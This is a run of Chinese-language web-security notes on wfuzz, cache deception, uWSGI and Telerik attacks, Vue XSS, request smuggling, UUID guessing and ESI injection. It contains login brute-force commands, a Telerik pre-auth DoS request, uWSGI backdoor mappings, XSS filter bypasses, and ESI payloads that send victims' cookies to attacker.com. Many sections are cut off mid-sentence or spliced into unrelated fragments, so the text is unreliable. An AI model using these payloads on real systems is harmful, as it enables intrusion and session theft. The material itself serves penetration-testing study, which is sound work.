核心要点 Wfuzz has been created to facilitate the task in web applications assessments and it is based on a simple concept: it replaces any reference to the FUZZ keyword by the value of a given 载荷. https://github.com/carlospolop/fuzzhttpbypass # 命令 / 载荷 / 操作片段 # 1. Installation 1pip install wfuzz # 2. Filtering options 123456789--hs/ss "regex" #Hide/Show#Simple example, match a string: "Invalid username"#Regex example: "Invalid *"--hc/sc CODE #Hide/Show by code in response--hl/sl NUM #Hide/Show by number of lines in response--hw/sw NUM #Hide/Show by number of words in response--hh/sh NUM #Hide/Show by number of chars in response--hc/sc NUM #Hide/Show by response code # 3. Output options 12wfuzz -e printers #Prints the available output formats-f /tmp/output,csv #Saves the output in that location in csv format # 4. Encoders options 12wfuzz -e encoders #Prints the available encoders#Examples: urlencode, md5, base64, hexlify, uri_hex, doble urlencode # 5. Encoders options 123-z file,/path/to/file,md5 #Will use a list inside the file, and will transform each value into its md5 hash before sending it-w /path/to/file,base64 #Will use a list, and transform to base64-z list,each-element-here,hexlify #Inline list and to hex before sending values # 6. POST, Single list, filter string (hide) 12wfuzz -c -w users.txt --hs "Login name" -d "name=FUZZ&password=FUZZ&autologin=1&enter=Sign+in" http://zipper.htb/zabbix/index.php#Here we have filtered by line # 7. POST, 2 lists, filter code (show) 12wfuzz.py -c -z file,users.txt -z file,pass.txt --sc 200 -d "name=FUZZ&password=FUZ2Z&autologin=1&enter=Sign+in" http://zipper.htb/zabbix/index.php#Here we have filtered by code # 8. GET, 2 lists, filter string (show), proxy, cookies 1wfuzz -c -w users.txt -w pass.txt --ss "Welcome " -p 127.0.0.1:8080:HTTP -b "PHPSESSIONID=1234567890abcdef;customcookie=hey" "http://example.com/index.php?username=FUZZ&password=FUZ2Z&action=sign+in" # 9. Bruteforce Directory/RESTful bruteforce 1wfuzz -c -w /tmp/tmp/params.txt --hc 404 https://domain.com/api/FUZZ # 10. Path Parameters BF 1wfuzz -c -w ~/git/Arjun/db/params.txt --hw 11 'http://example.com/path%3BFUZZ=FUZZ' # 11. Basic, 2 lists, filter string (show), proxy 1wfuzz -c -w users.txt -w pass.txt -p 127.0.0.1:8080:HTTP --ss "Welcome" --basic FUZZ:FUZ2Z "http://example.com/index.php" # 12. NTLM, 2 lists, filter string (show), proxy 1wfuzz -c -w users.txt -w pass.txt -p 127.0.0.1:8080:HTTP --ss "Welcome" --ntlm 'domain\FUZZ:FUZ2Z' "http://example.com/index.php" # 13. Cookie, filter code (show), proxy 1wfuzz -c -w users.txt -p 127.0.0.1:8080:HTTP --ss "Welcome " -H "Cookie:id=1312321&user=FUZZ" "http://example.com/index.php" # 14. User-Agent, filter code (hide), proxy 1wfuzz -c -w user-agents.txt -p 127.0.0.1:8080:HTTP --ss "Welcome " -H "User-Agent: FUZZ" "http://example.com/index.php" # 15. Host 123wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt --hc 400,404,403 -H "Host: FUZZ.example.com" -uhttp://example.com -t 100 # 16. Using file 1wfuzz -c -w methods.txt -p 127.0.0.1:8080:HTTP --sc 200 -X FUZZ "http://example.com/index.php" # 17. Using inline list 1$ wfuzz -z list,GET-HEAD-POST-TRACE-OPTIONS -X FUZZ http://testphp.vulnweb.com/ # 18. Directory & Files Bruteforce 12#Filter by whitelisting codeswfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --sc 200,202,204,301,302,307,403 http://example.com/uploads/FUZZ # 工具与参考入口 Wfuzz Arjun parameters wordlist https://github.com/carlospolop/fuzzhttpbypass # 检查清单 是否定位输入点和服务端解析点 是否验证权限边界 / 租户边界 是否从最小化 payload 开始 是否记录成功与失败条件 # 关联 Web 安全总览 知识地图 Active Directory 攻击链 # 扩展记录 可在这里补充实验环境、样例、检测规

content: 来源路径： 02-知识点/Web安全/Web Cache Deception 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Web Cache Deception 技术笔记 [!summary] 提炼定位 面向 Web 安全 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 判断、验证或绕过 Web Cache Deception 技术笔记 相关 Web 漏洞。 从输入点、解析链、权限边界、数据落点和回显 / 盲信道五个维度拆解。 # 中文提炼 核心目标是判断 Web Cache Deception 技术笔记 的输入是否能影响服务端解析、权限判断或数据落点。 优先关注：Web Cache Deception、工具、方法论、Caching Sensitive Data、Caching Custom JavaScript；从最小 payload 开始证明可控，再扩展到读、写、执行或越权。 验证时把请求方法、参数位置、编码方式、Content-Type、身份状态和响应差异一起记录。 防御视角要补输入规范化、服务端校验、最小权限、日志与告警信号。 本页已沉淀 2 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Web Cache Deception 工具 方法论 Caching Sensitive Data Caching Custom JavaScript Tricks Detecting Web Cache Deception CloudFlare Caching # 核心要点 Web Cache Deception (WCD) is a security 漏洞 that occurs when a web server or caching proxy misinterprets a client's request for a web resource and subsequently serves a different resource, which may often be more sensitive or private, after caching it. Imagine an attacker lures a logged-in victim into accessing http://www.example.com/home.php/non-existent.css When the attacker requests http://www.example.com/home.php/non-existent.css, the request is sent to the cache server, and the cache server returns the cached file with the victim's sensitive home.php data. Video of the attack by Omer Gil：Web Cache Deception Attack in PayPal Home Page Attacker crafts a dedicated .css path of the /api/auth/session endpoint. Attacker distributes the link Cloudflare allows .jpg to be served as image/webp or .gif as video/webm and other cases that we think are unlikely to be attacks. Bypassing Cache Deception Armor using .avif extension file：fixed # 命令 / 载荷 / 操作片段 # 1. Caching Custom JavaScript 12345678Values: User-Agent Values: Cookie Header: X-Forwarded-Host Header: X-Host Header: X-Forwarded-Server Header: X-Forwarded-Scheme (header; also in combination with X-Forwarded-Host) Header: X-Original-URL (Symfony) Header: X-Rewrite-URL (Symfony) # 2. Caching Custom JavaScript 12345678GET /test?buster=123 HTTP/1.1 Host: target.com X-Forwarded-Host: test"> HTTP/1.1 200 OK Cache-Control: public, no-cache [..] <meta property="og:image" content="https://test">"> # 工具与参考入口 PortSwigger/param-miner [ Web cache deception lab delimiter list cloudflare/default-cache-behavior Bypassing Cache Deception Armor using .avif extension file：fixed PortSwigger Labs for Web Cache Deception Cache Deception Armor：Cloudflare：May 20, 2023 Exploiting cache design flaws：PortSwigger：May 4, 2020 Exploiting cache implementation flaws：PortSwigger：May 4, 2020 OpenAI Account Takeover：Nagli (@naglinagli)：March 24, 2023 Practical Web Cache Poisoning：James Kettle (@albinowax)：August 9, 2018 Web Cache Deception Attack：Omer Gil：February 27, 2017 Web cache poisoning：PortSwigger：May 4, 2020 # 检查清单 是否定位输入点和服务端解析点 是否验证权限边界 / 租户边界 是否从最小化 payload 开始 是否记录成功与失败条件 # 关联 Web 安全总览 知识地图 云身份与权限 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

title: Web API Pentesting 技术笔记
content: 来源路径： 02-知识点/Web安全/Web API Pentesting 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Web API Pentesting 技术笔记 [!summary] 提炼定位 面向 Web 安全 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 判断、验证或绕过 Web API Pentesting 技术笔记 相关 Web 漏洞。 从输入点、解析链、权限边界、数据落点和回显 / 盲信道五个维度拆解。 # 中文提炼 核心目标是判断 Web API Pentesting 技术笔记 的输入是否能影响服务端解析、权限判断或数据落点。 优先关注：Web API Pentesting、API Pentesting 方法论 Summary、Understanding API Types、Practice Labs、Effective Tricks for API Pentesting；从最小 payload 开始证明可控，再扩展到读、写、执行或越权。 验证时把请求方法、参数位置、编码方式、Content-Type、身份状态和响应差异一起记录。 防御视角要补输入规范化、服务端校验、最小权限、日志与告警信号。 本页已沉淀 4 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Web API Pentesting API Pentesting 方法论 Summary Understanding API Types Practice Labs Effective Tricks for API Pentesting 授权 & 业务逻辑 (AuthN != AuthZ) — tRPC/Zod protectedProcedure pitfalls 工具 and Resources for API Pentesting Learning and Practice Resources # 核心要点 Pentesting APIs involves a structured approach to uncovering vulnerabilities. This guide encapsulates a comprehensive 方法论，emphasizing practical techniques and 工具. VAmPI: A deliberately vulnerable API for hands-on practice, covering the OWASP top 10 API vulnerabilities. SOAP/XML Vulnerabilities: Explore XXE vulnerabilities, although DTD declarations are often restricted. CDATA tags may allow 载荷 insertion if the XML remains valid. 权限提升: Test endpoints with varying privilege levels to identify unauthorized access possibilities. CORS Misconfigurations: Investigate CORS settings for potential exploitability through CSRF attacks from authenticated sessions. Content-Type Manipulation: Switch between different content types (x-www-form-urlencoded, application/xml, application/json) to test for parsing issues or vulnerabilities. Advanced Parameter Techniques: Test with unexpected data types in JSON 载荷 or play with XML data for XXE injections. Also, try parameter pollution and wildcard characters for broader testing. Version Testing: Older API versions might be more susceptible to attacks. Always check for and test against multiple API versions. Threat model: Any low-privileged authenticated user can call admin-grade procedures if role checks are missing (e.g., background migrations, feature flags, tenant-wide maintenance, job control). Black-box signal: POST /api/trpc/<router>.<procedure> endpoints that succeed for basic accounts when they should be admin-only. Self-serve signups drastically increase exploitability. kiterunner: Excellent for discovering API endpoints. Use it to scan and brute force paths and parameters against target APIs. https://github.com/BishopFox/sj: sj is a command line tool designed to assist with auditing of exposed Swagger/OpenAPI definition files by checking the associated API endpoints for weak 认证. It also provides command templates for manual 漏洞 testing. Additional 工具 like automatic-api-attack-tool, Astra, and restler-fuzzer offer tailored functionalities for API security testing, ranging from attack simulation to fuzzing and 漏洞 scanning. Loads and executes an arbitrary Python file as a WSGI application. If an attacker can control this parameter through the uwsgi param bag, they can achieve Remote Code Execution (RCE). Loads a specified script as a new application. Combined with file 上传 or write capabilities, this can lead to RCE. If you can write a python file on disk (the extension doesn’t matter) with code like: If uWSGI runs with elevated privileges and writes sockets/pids owned by root, abusing env and directory changes may help you drop files with privileged owners or manipulate runtime state. Overriding configuration via environment (UWSGI *) inside a file loaded through UWSGI FILE can affect process model and workers to make 持久化 stealthier. CVE-2023-27522 (Apache httpd 2.4.30–2.4.55; also relevant to uWSGI integration prior to 2.0.22/2.0.26 fixes): crafted origin response headers can cause HTTP response smuggling when mod proxy uwsgi is in use. Upgrading Apache to ≥2.4.56 mitigates the issue. # 命令 / 载荷 / 操作片段 # 1. Dangerous mappings in front proxies (nginx example) 12345678location /app/ { include uwsgi_params; # DANGEROUS: maps query args into uwsgi params uwsgi_param UWSGI_FILE $arg_f; # /app/?f=/tmp/backdoor.py uwsgi_param UWSGI_MODULE $http_x_mod; # header: X-Mod: pkg.mod uwsgi_param UWSGI_CALLABLE $arg_c; # /app/?c=application uwsgi_pass unix:/run/uwsgi/app.sock;} # 2. UWSGI FILE：Arbitrary File Load/Execute 1uwsgi_param UWSGI_FILE /path/to/python/file.py; # 3. UWSGI SCRIPT：Script Loading 12uwsgi_param UWSGI_SCRIPT module.path:callable;uwsgi_param SCRIPT_NAME /endpoint; # 4. UWSGI SETENV：Environment Variable Manipulation 1uwsgi_param UWSGI_SETENV DJANGO_SETTINGS_MODULE=malicious.settings; # 6. UWSGI PYHOME：Python Environment Manipulation 1uwsgi_param UWSGI_PYHOME /path/to/malicious/venv; # 7. UWSGI CHDIR：Directory Change 1uwsgi_param UWSGI_CHDIR /etc/; # 8. title: Vue.js 技术笔记
content: 来源路径： 02-知识点/Web安全/Vue.js 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Vue.js 技术笔记 [!summary] 提炼定位 面向 Web 安全 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 判断、验证或绕过 Vue.js 技术笔记 相关 Web 漏洞。 从输入点、解析链、权限边界、数据落点和回显 / 盲信道五个维度拆解。 # 中文提炼 核心目标是判断 Vue.js 技术笔记 的输入是否能影响服务端解析、权限判断或数据落点。 优先关注：Vue.js、XSS Sinks in Vue.js、v-html Directive；从最小 payload 开始证明可控，再扩展到读、写、执行或越权。 验证时把请求方法、参数位置、编码方式、Content-Type、身份状态和响应差异一起记录。 防御视角要补输入规范化、服务端校验、最小权限、日志与告警信号。 本页已沉淀 12 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Vue.js XSS Sinks in Vue.js v-html Directive # 核心要点 <img v-bind:[userAttr]="载荷"> headers: # 命令 / 载荷 / 操作片段 # 1. v-html Directive 12### v-bind with src or hrefBinding a user string to URL-bearing attributes (`href`, `src`, `xlink:href`, `formaction` …) lets payloads such as `javascript:alert(1)` run when the link is followed. # 2. v-html Directive 12### v-on with user-controlled handlers`v-on` compiles its value with `new Function`; if that value comes from the user, you hand them code-execution on a plate. # 3. v-html Directive 12### Dynamic attribute / event namesUser-supplied names in `v-bind:[attr]` or `v-on:[event]` let attackers create any attribute or event handler, bypassing static analysis and many CSP rules. # 4. v-html Directive 12### Dynamic component (`<component :is>`)Allowing user strings in `:is` can mount arbitrary components or inline templates—dangerous in the browser and catastrophic in SSR. # 5. v-html Directive 12### Untrusted templates in SSRDuring server-side rendering, the template runs **on your server**; injecting user HTML can escalate XSS to full Remote Code Execution (RCE). CVEs in `vue-template-compiler` prove the risk. # 6. v-html Directive 12### Filters / render functions that evalLegacy filters that build render strings or call `eval`/`new Function` on user data are another XSS vector—replace them with computed properties. # 7. v-html Directive 123456---## Other Common Vulnerabilities in Vue Projects### Prototype pollution in pluginsDeep-merge helpers in some plugins (e.g., **vue-i18n**) have allowed attackers to write to `Object.prototype`. # 8. v-html Directive 12### Open redirects with vue-routerPassing unchecked user URLs to `router.push` or `<router-link>` can redirect to `javascript:` URIs or phishing domains. # 9. v-html Directive 12### CSRF in Axios / fetchSPAs still need server-side CSRF tokens; SameSite cookies alone can’t block auto-submitted cross-origin POSTs. # 10. v-html Directive 12### Click-jackingVue apps are frameable unless you send both `X-Frame-Options: DENY` and `Content-Security-Policy: frame-ancestors 'none'`. # 11. v-html Directive 12### Content-Security-Policy pitfallsThe full Vue build needs `unsafe-eval`; switch to the runtime build or pre-compiled templates so you can drop that dangerous source. # 12. v-html Directive 12### Supply-chain attacks (node-ipc – March 2022)The sabotage of **node-ipc**—pulled by Vue CLI—showed how a transitive dependency can run arbitrary code on dev machines. Pin versions and audit often. # 工具与参考入口 https://www.stackhawk.com/blog/vue-xss-guide-examples-and-prevention/ https://medium.com/@isaacwangethi30/vue-js-security-6e246a7613da https://vuejs.org/guide/best-practices/security # 检查清单 是否定位输入点和服务端解析点 是否验证权限边界 / 租户边界 是否从最小化 payload 开始 是否记录成功与失败条件 # 关联 Web 安全总览 知识地图 XSS 跨站脚本 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

The following proxies inherently forward these headers during proxy-pass, thereby inherently enabling H2C smuggling: For additional information on this 漏洞，particularly concerning NGINX, refer to this detailed resource. Websocket smuggling, unlike creating a HTTP2 tunnel to an endpoint accessible via a proxy, establishes a Websocket tunnel to 绕过 potential proxy limitations and facilitate direct communication with the endpoint. In this scenario, a backend that offers a public WebSocket API alongside an inaccessible internal REST API is targeted by a malicious client seeking access to the internal REST API. The attack unfolds in several steps: The backend responds with a status code 426, indicating the incorrect protocol version in the Sec-WebSocket-Version header. The reverse proxy, overlooking the backend's response status, assumes readiness for WebSocket communication and relays the response to the client. This scenario involves a backend with both a public WebSocket API and a public REST API for health checking, along with an inaccessible internal REST API. The attack, more complex, involves the following steps: # 命令 / 载荷 / 操作片段 # 1. HTTP2 Over Cleartext (H2C) <a href="#http2-over-cleartext-h2c" id="http2-over-cleartext-h2c"></a> 123Upgrade: h2cHTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAAConnection: Upgrade, HTTP2-Settings # 工具与参考入口 h2csmuggler by BishopFox h2csmuggler by assetnote https://github.com/0ang3el/websocket-smuggle/raw/master/img/2-4.png https://github.com/0ang3el/websocket-smuggle/raw/master/img/3-4.png https://github.com/0ang3el/websocket-smuggle/raw/master/img/3-5.png https://github.com/0ang3el/websocket-smuggle.git https://blog.assetnote.io/2021/03/18/h2c-smuggling/ https://bishopfox.com/blog/h2c-smuggling-request # 检查清单 是否定位输入点和服务端解析点 是否验证权限边界 / 租户边界 是否从最小化 payload 开始 是否记录成功与失败条件 # 关联 Web 安全总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

Check it for further details (images taken from there). It's crucial to comprehend these concepts to effectively handle and mitigate potential issues arising from Unicode's complexity and its various encoding methods. A list of Unicode equivalent characters can be found here: https://appcheck-ng.com/wp-content/uploads/unicode normalization.html and https://0xacb.com/normalization table Then, a malicious user could insert a different Unicode character equivalent to ' (0x27) like %ef%bc%87 , when the input gets normalised, a single quote is created and a SQLInjection 漏洞 appears: You could use one of the following characters to trick the webapp and 利用 a XSS: Login / 密码 reset /admin search / SSO callback canonicalizes with NFC/NFKC, casefold(), IDNA or a custom transliteration library # 命令 / 载荷 / 操作片段 # 1. content: 来源路径： 02-知识点/Web安全/UUID Insecurities 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # UUID Insecurities 技术笔记 [!summary] 提炼定位 面向 Web 安全 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 判断、验证或绕过 UUID Insecurities 技术笔记 相关 Web 漏洞。 从输入点、解析链、权限边界、数据落点和回显 / 盲信道五个维度拆解。 # 中文提炼 核心目标是判断 UUID Insecurities 技术笔记 的输入是否能影响服务端解析、权限判断或数据落点。 优先关注：UUID Insecurities、Basic Information、Sandwich attack、Example、工具；从最小 payload 开始证明可控，再扩展到读、写、执行或越权。 验证时把请求方法、参数位置、编码方式、Content-Type、身份状态和响应差异一起记录。 防御视角要补输入规范化、服务端校验、最小权限、日志与告警信号。 本页当前以概念和流程为主；后续实验时可补充最小复现命令和输出样例。 # 关键主题 UUID Insecurities Basic Information Sandwich attack Example 工具 # 核心要点 UUID v3 and v5 generate UUIDs using 哈希 values from namespace and name, with v3 using MD5 and v5 using SHA-1. Imagine a web application that uses UUID v1 for generating 密码 reset links. Here’s how an attacker might 利用 this to gain unauthorized access: The attacker has control over two email accounts: \attacker1@acme.com\ and \attacker2@acme.com. The attacker triggers a 密码 reset for their first account (\attacker1@acme.com) and receives a 密码 reset link with a UUID, say \99874128-7592-11e9-8201-bb2f15014a14. Immediately after, the attacker triggers a 密码 reset for the victim's account (\victim@acme.com) and then quickly for the second attacker-controlled account (\attacker2@acme.com). The attacker receives a reset link for the second account with a UUID, say \998796b4-7592-11e9-8201-bb2f15014a14. The attacker now has two UUIDs generated close in time (\99874128\ and \998796b4). Given the sequential nature of time-based UUIDs, the UUID for the victim's account will likely fall between these two values. The attacker uses a tool to generate UUIDs between these two values and tests each generated UUID by attempting to access the 密码 reset link (e.g., \https://www.acme.com/reset/<generated-UUID>). If the web application does not adequately rate limit or block such attempts, the attacker can quickly test all possible UUIDs in the range. Once the correct UUID for the victim's 密码 reset link is discovered, the attacker can reset the victim's 密码 and gain unauthorized access to their account. You can perform the sandwich attack automatically with the tool: https://github.com/Lupin-Holmes/sandwich You can detect these type of UUIds in Burp Suite with the extension UUID Detector. # 工具与参考入口 https://github.com/Lupin-Holmes/sandwich UUID Detector https://versprite.com/blog/universally-unique-identifiers/ # 检查清单 是否定位输入点和服务端解析点 是否验证权限边界 / 租户边界 是否从最小化 payload 开始 是否记录成功与失败条件 # 关联 Web 安全总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

The handler resolves it with Type.GetType() and invokes Activator.CreateInstance() before verifying interface type-safety. Any public parameterless .NET type constructor will run. Universal pre‑auth DoS with a .NET framework gadget (PowerShell WSMan finalizer). Telerik UI for ASP.NET AJAX versions 2011.2.712 through 2025.1.218 (inclusive) are vulnerable. Trigger path for the vulnerable code-path requires: type=iec, dkey=1, and prtype=<AssemblyQualifiedType>. Some PoCs use dtype; the implementation checks dkey=="1" for the 下载 flow. Compare the recovered version against the vulnerable range (2011.2.712 to 2025.1.218) and the fixed build (2025.1.416+). Red teams can quickly distinguish "handler exposed" from "likely still on a vulnerable DLL". Some ctors (or static initializers) immediately read Request query/body/cookies/headers and (de)serialize them. Example (Sitecore): a ctor chain reaches GetLayoutDefinition() which reads HTTP body "layout" and deserializes JSON via JSON.NET. Ctros that load or deserialize config/blobs from disk can be coerced if you can write to those paths (uploads/temp/data folders). Many apps add AppDomain.CurrentDomain.AssemblyResolve handlers that build DLL paths from args.Name without sanitization. If you can influence type resolution you can coerce arbitrary DLL loads from attacker‑controlled paths. Some types delete fixed-path files in finalizers. Combined with link-following or predictable paths this can enable local 权限提升 in certain environments. Step 2 – Post‑auth: Obtain write into a resolver-probed directory (e.g., via an auth 绕过 or weak 上传) and plant a malicious DLL. Safe lab validation: Fire the DoS 载荷 and watch for app pool recycle/unhandled exception tied to the WSMan finalizer. # 命令 / 载荷 / 操作片段 # 1. Affected surface and quick discovery 1GET /Telerik.Web.UI.WebResource.axd?type=iec&dkey=1&prtype=Namespace.Type, Assembly # 2. Affected surface and quick discovery 1234<add path="Telerik.Web.UI.WebResource.axd" type="Telerik.Web.UI.WebResource" verb="*" validate="false" /><add name="Telerik_Web_UI_WebResource_axd" path="Telerik.Web.UI.WebResource.axd" type="Telerik.Web.UI.WebResource" verb="*" preCondition="integratedMode" /> # 3. Affected surface and quick discovery 123rg -n 'Telerik\.Web\.UI\.WebResource\.axd|Telerik\.Web\.UI\.WebResource' web.config **/*.configcurl -skI https://target/Telerik.Web.UI.WebResource.axdcurl -sk 'https://target/Telerik.Web.UI.WebResource.axd?type=iec' # 4. Fast version triage on legacy installs 123456for YEAR in $(seq 2011 2025); do echo -n "$YEAR: " python3 CVE-2019-18935.py -t -v "$YEAR" -p /dev/null \ -u 'https://target/Telerik.Web.UI.WebResource.axd?type=rau' 2>/dev/null | grep -oE "Telerik.Web.UI, Version=$YEAR\\.[0-9\\.]+" || echodone # 5. Universal DoS gadget (no app-specific gadgets required) 1GET /Telerik.Web.UI.WebResource.axd?type=iec&dkey=1&prtype=System.Management.Automation.Remoting.WSManPluginManagedEntryInstanceWrapper,+System.Management.Automation,+Version%3d3.0.0.0,+Culture%3dneutral,+PublicKeyToken%3d31bf3856ad364e35 # 6. From DoS to RCE – escalation patterns 1This.Class.Does.Not.Exist, watchTowr # 7. Example pre‑auth RCE chain (Sitecore XP) 12345# Load the insecure resolver (no auth on many setups)GET /-/xaml/Sitecore.Shell.Xaml.WebControl# Coerce the resolver via Telerik unsafe reflectionGET /Telerik

If-Range: Creates a conditional range request that is only fulfilled if the given etag or date matches the remote resource. Used to prevent downloading two ranges from incompatible version of the resource. The Content-Disposition header in HTTP responses directs whether a file should be displayed inline (within the webpage) or treated as an attachment (downloaded). For instance: # 命令 / 载荷 / 操作片段 # 1. Downloads 1Content-Disposition: attachment; filename="filename.jpg" # 2. Trusted Types 1234567// Feature detectionif (window.trustedTypes && trustedTypes.createPolicy) { // Name and create a policy const policy = trustedTypes.createPolicy('escapePolicy', { createHTML: str => str.replace(/\</g, '&lt;').replace(/>/g, '&gt;'); });} # 3. Trusted Types 1234// Assignment of raw strings is blocked, ensuring safety.el.innerHTML = "some string" // Throws an exception.const escaped = policy.createHTML("<img src=x onerror=alert(1)>")el.innerHTML = escaped // Results in safe assignment. # 4. X-Content-Type-Options 1X-Content-Type-Options: nosniff # 5. X-Frame-Options 1X-Frame-Options: DENY # 6. Cross-Origin Resource Policy (CORP) and Cross-Origin Resource Sharing (CORS) 123Cross-Origin-Resource-Policy: same-originAccess-Control-Allow-Origin: https://example.comAccess-Control-Allow-Credentials: true # 7. Cross-Origin Embedder Policy (COEP) and Cross-Origin Opener Policy (COOP) 12Cross-Origin-Embedder-Policy: require-corpCross-Origin-Opener-Policy: same-origin-allow-popups # 8. HTTP Strict Transport Security (HSTS) 1Strict-Transport-Security: max-age=3153600 # 9. Permissions-Policy (formerly Feature-Policy) 1Permissions-Policy: geolocation=(), camera=(), microphone=() # 10. Permissions-Policy (formerly Feature-Policy) 12345678# Restrictive policy - disable most featuresPermissions-Policy: geolocation=(), camera=(), microphone=(), payment=(), usb=()# Allow camera only from same originPermissions-Policy: camera=(self)# Allow geolocation for same origin and a trusted partnerPermissions-Policy: geolocation=(self "https://maps.example.com") # 11. content: 来源路径： 02-知识点/Web安全/Source code Review - SAST 工具.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Source code Review - SAST 工具 [!summary] 提炼定位 面向 Web 安全 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 判断、验证或绕过 Source code Review - SAST 工具 相关 Web 漏洞。 从输入点、解析链、权限边界、数据落点和回显 / 盲信道五个维度拆解。 # 中文提炼 核心目标是判断 Source code Review - SAST 工具 的输入是否能影响服务端解析、权限判断或数据落点。 优先关注：Source code Review / SAST 工具、Guidance and & Lists of 工具、C/C++ Manual Review Gotchas、Non-reentrant libc return buffers breaking security checks、Validated input reused later in system () /shell-outs；从最小 payload 开始证明可控，再扩展到读、写、执行或越权。 验证时把请求方法、参数位置、编码方式、Content-Type、身份状态和响应差异一起记录。 防御视角要补输入规范化、服务端校验、最小权限、日志与告警信号。 本页已沉淀 23 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Source code Review / SAST 工具 Guidance and & Lists of 工具 C/C++ Manual Review Gotchas Non-reentrant libc return buffers breaking security checks Validated input reused later in system() / shell-outs User-controlled registry/config source steering kernel control flow Windows path handling footguns worth checking Multi-Language 工具 Naxus：AI-Gents Semgrep Supported Languages Quick Start SonarQube CodeQL Install Quick Start：Prepare the database Quick Start：Analyze the code Quick Start：Scripted # 核心要点 When reviewing C/C++ manually, look for APIs and patterns that appear safe in isolation but become exploitable when their outputs are reused later in the control flow. Some legacy networking/string helpers return pointers to static internal storage. A classic example is inet ntoa(): storing the returned pointer and calling the function again usually means the second call overwrites the same buffer. Prefer APIs that write into a caller-provided buffer (inet ntop, snprintf, explicit copies with fixed bounds). A frequent review failure is validating input with a parser and later reusing the original raw string in a shell command: Parsing the data does not make the original string safe. If execution reaches system(), popen(), execl("/bin/sh", ...), or similar shell-backed helpers, metacharacters in the original input can still become 命令注入 / RCE. The original string is later passed to a shell. avoid the shell entirely derive the executed argument from the validated canonical form instead of the original input You can also allow codeql to identify all the languages for you and create a DB per language. You need to give it a GITHUB 令牌. nodejsscan**😗* Static security code scanner (SAST) for Node.js applications powered by libsast and semgrep. RetireJS**😗* The goal of Retire.js is to help you detect the use of JS-library versions with known vulnerabilities. electronegativity**😗* It's a tool to identify misconfigurations and security anti-patterns in Electron-based applications. Bandit**😗* Bandit is a tool designed to find common security issues in Python code. To do this Bandit processes each file, builds an AST from it, and runs appropriate plugins against the AST nodes. Once Bandit has finished scanning all the files it generates a report. safety: Safety checks Python dependencies for known security vulnerabilities and suggests the proper remediations for vulnerabilities detected. Safety can be run on developer machines, in CI/CD pipelines and on production systems. # 命令 / 载荷 / 操作片段 # 1. Validated input reused later in system() / shell-outs 123456if (!inet_aton(ip_addr, &parsed)) { return 1;}snprintf(cmd, sizeof(cmd), "ping '%s'", ip_addr);system(cmd); # 3. Because the process runs with the same shell UID capabilities that ADB uses, an app that is explicitly authorised by the user can proxy Binder calls to system services without rooting the device. Collecting logs, package metadata and shell-visible network/process state moe.shizuku.privileged.api can be started in three different ways. The Binder interface exposed to client apps is the same, but the effective privilege depends on whether the backend is ADB/shell or root. The same script can be executed over a network ADB connection (adb connect <IP>:5555). If the device is already rooted run: ADB/shell and root are different privilege levels. Shizuku.getUid() returns 2000 for shell-backed sessions and 0 for root-backed sessions. Shell permissions change between Android releases and can also be trimmed by OEMs. Shell still cannot directly read another app's private sandbox such as /data/user/0/<package>. Hidden API restrictions still apply to code running in the normal app process; if you need non-SDK interfaces extensively, move the logic into a UserService or use a dedicated hidden-API 绕过. Enumerate listening sockets and map them to packages: Dump every application's logs exposed to shell: Monitor for Binder services exposing moe.shizuku.privileged.api. A blind 利用 approach can also be used as a request should arrive to the attackers server: GoSecure created a table to understand possible attacks that we can try against different ESI-capable software, depending on the functionality supported: Vars: Supports the esi:vars directive. Useful for bypassing XSS Filters Add header in response (useful to 绕过 "Content-Type: text/json" in a response with XSS) It's possible to use eXtensible Stylesheet Language Transformations (XSLT) syntax in ESI just by indicating the param dca value as xslt. Which might allow to abuse XSLT to create and abuse a XML 外部实体 XXE 漏洞 (XXE): # 命令 / 载荷 / 操作片段 # 1. ESI 检测 1Surrogate-Control: content="ESI/1.0" # 2. ESI 检测 123456789101112131415161718// Basic detectionhello// If previous is reflected as "hello", it's vulnerable// Blind detection<esi:include src=http://attacker.com>// XSS Exploitation Example<esi:include src=http://attacker.com/XSSPAYLOAD.html>// Cookie Stealer (bypass httpOnly flag)<esi:include src=http://attacker.com/?cookie_stealer.php?=$(HTTP_COOKIE)>// Introduce private local files (Not LFI per se)<esi:include src="supersecret.txt">// Valid for Akamai, sends debug information in the response<esi:debug/> # 3. XSS 1<esi:include src=http://attacker.com/xss.html> # 4. 绕过 client XSS protection 12345x=<esi:assign name="var1" value="'cript'"/><s<esi:vars name="$(var1)"/>>alert(/Chrome%20XSS%20filter%20bypass/);</s<esi:vars name="$(var1)"/>>Use to bypass WAFs:<script>alert(1)</script><img+src=x+onerror=alert(1)> # 5. Steal Cookie 12<esi:include src=http://attacker.com/$(HTTP_COOKIE)><esi:include src="http://attacker.com/?cookie=$(HTTP_COOKIE{'JSESSIONID'})" /> # 6. Steal 